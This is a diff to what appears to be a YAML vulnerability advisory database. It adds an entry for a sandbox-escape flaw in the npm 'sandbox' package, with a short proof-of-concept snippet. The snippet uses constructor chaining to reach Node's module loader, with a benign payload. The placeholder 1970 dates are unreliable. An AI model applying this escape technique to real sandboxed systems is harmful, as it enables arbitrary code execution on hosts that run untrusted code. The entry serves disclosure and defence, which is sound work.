@@ -1,4 +1,28 @@
 ---
+- id: npmjs:npm:sandbox:766
+  title: Sandbox Breakout / Arbitrary Code Execution
+  description: |-
+    All versions of `sandbox` are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.
+
+    ## Proof of concept
+    ```
+    var Sandbox = require("sandbox")
+    s = new Sandbox()
+    code = `new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("util").inspect("hi")`
+    s.run(code)
+    ```
+  affected_package: sandbox
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe: CWE-20
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Lucas Fiegl
+  references: https://npmjs.com/advisories/766
+  source_url: https://npmjs.com/advisories/766
 - id: snykio:npm:sandbox:20160821
   title: Arbitrary Code Execution
   description: |
